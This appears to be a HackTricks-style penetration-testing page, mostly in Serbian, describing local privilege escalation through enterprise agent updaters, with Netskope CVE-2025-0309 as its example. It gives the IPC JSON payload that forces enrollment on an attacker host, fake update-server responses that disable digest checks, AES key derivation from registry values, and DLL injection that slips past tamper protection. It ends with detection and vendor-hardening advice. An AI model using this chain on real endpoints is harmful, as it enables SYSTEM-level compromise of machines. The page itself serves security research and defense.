# Zloupotreba enterprise auto-updater-a i privilegisanog IPC-a (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updatereima koji izlažu low‑friction IPC surface i privilegovan update flow. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može prisiliti enrollment na server koji kontroliše napadač i zatim isporučiti maliciozni MSI koji SYSTEM service instalira.

Ključne ideje koje možete ponovo koristiti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegisanog servisa da biste prisilili re‑enrollment ili rekonfiguraciju na napadačev server.
- Implementirajte vendorove update endpoint-e, isporučite rogue Trusted Root CA i usmerite updater na maliciozni, “signed” paket.
- Izbegavajte slabe provere signera (CN allow‑lists), opcione digest flagove i labave MSI osobine.
- Ako je IPC “encrypted”, izvedite key/IV iz world‑readable identifikatora mašine sačuvanih u registry-ju.
- Ako servis ograničava pozivaoce po image path/process name, inject-ujte u allow‑listed proces ili pokrenite jedan suspended i bootstrap-ujte svoj DLL putem minimalnog thread‑context patch-a.

---
## 1) Prisila za enrollment na napadačev server preko localhost IPC-a

Mnogi agenti isporučuju user‑mode UI proces koji komunicira sa SYSTEM servisom preko localhost TCP koristeći JSON.

Primećeno u Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok exploita:
1) Sastavite JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da nije potreban potpis.
2) Pošaljite IPC poruku koja poziva provisioning komandu sa vašim JWT-om i tenant imenom:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da kontaktira vaš lažni server za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako je verifikacija pozivaoca bazirana na putanji/ime‑u, inicirajte zahtev iz binarnog fajla dobavljača koji je na listi dozvoljenih (pogledaj §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Kada client počne da komunicira sa vašim serverom, implementirajte očekivane endpoints i usmerite ga na attacker MSI. Tipičan redosled:

1) /v2/config/org/clientconfig → Vrati JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vraća PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Obezbeđuje metapodatke koji upućuju na maliciozni MSI i lažnu verziju.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: servis može da proverava samo da li Subject CN jednako “netSkope Inc” ili “Netskope, Inc.”. Vaš rogue CA može da izda leaf sertifikat sa tim CN i potpiše MSI.
- CERT_DIGEST property: uključite benignu MSI property po imenu CERT_DIGEST. Nema sprovođenja kontrole pri instalaciji.
- Optional digest enforcement: config flag (npr., check_msi_digest=false) onemogućava dodatnu kriptografsku validaciju.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Lažiranje šifrovanih IPC zahteva (when present)

Od R127, Netskope je umotao IPC JSON u polje encryptData koje izgleda kao Base64. Reversing je pokazao AES sa ključem/IV izvedenim iz vrednosti u registru čitljivih za bilo kog korisnika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju enkripciju i pošalju validne šifrovane komande iz standardnog korisnika. General tip: ako agent iznenada “encrypts” svoj IPC, potražite device IDs, product GUIDs, install IDs pod HKLM kao materijal.

---
## 4) Zaobilaženje IPC caller allow‑lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer rešavanjem PID‑a TCP konekcije i upoređivanjem image path/name protiv allow‑listovanih vendor binarnih fajlova smeštenih pod Program Files (npr., stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična zaobilaženja:
- DLL injection u allow‑listovan proces (npr., nsdiag.exe) i proxy‑ovanje IPC iznutra.
- Pokrenite allow‑listovani binarni fajl u suspendovanom stanju i inicijalizujte vašu proxy DLL bez CreateRemoteThread (vidi §5) kako biste zadovoljili pravila o zaštiti od manipulacije koje nameće driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (npr., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user‑mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binarnog fajla sa CREATE_SUSPENDED.
2) Nabavite handle‑ove koje vam je i dalje dozvoljeno: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesu, i handle threada sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patchevate kod na poznatom RIP‑u).
3) Overwrite ntdll!NtContinue (ili drugi rani, garantovano mapiran thunk) malim stubom koji poziva LoadLibraryW na putanji vaše DLL, zatim skače nazad.
4) ResumeThread da pokrenete vaš stub unutar procesa, učitavajući vašu DLL.

Pošto nikada niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME na već zaštićenom procesu (vi ste ga kreirali), pravilo driver‑a je zadovoljeno.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje malicioznog MSI‑a, i služi potrebne endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC klijent koji kreira proizvoljne (opciono AES‑šifrovane) IPC poruke i uključuje injekciju preko suspendovanog procesa da potiče iz allow‑listovanog binarnog fajla.

---
## 7) Detection opportunities (blue team)
- Monitor additions to Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) works well.
- Flag MSI executions initiated by the agent’s service from paths like C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Review agent logs for unexpected enrollment hosts/tenants, e.g.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – look for addonUrl / tenant anomalies and provisioning msg 148.
- Alert on localhost IPC clients that are not the expected signed binaries, or that originate from unusual child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts to a strict allow‑list; reject untrusted domains in clientcode.
- Authenticate IPC peers with OS primitives (ALPC security, named‑pipe SIDs) instead of image path/name checks.
- Keep secret material out of world‑readable HKLM; if IPC must be encrypted, derive keys from protected secrets or negotiate over authenticated channels.
- Treat the updater as a supply‑chain surface: require a full chain to a trusted CA you control, verify package signatures against pinned keys, and fail closed if validation is disabled in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
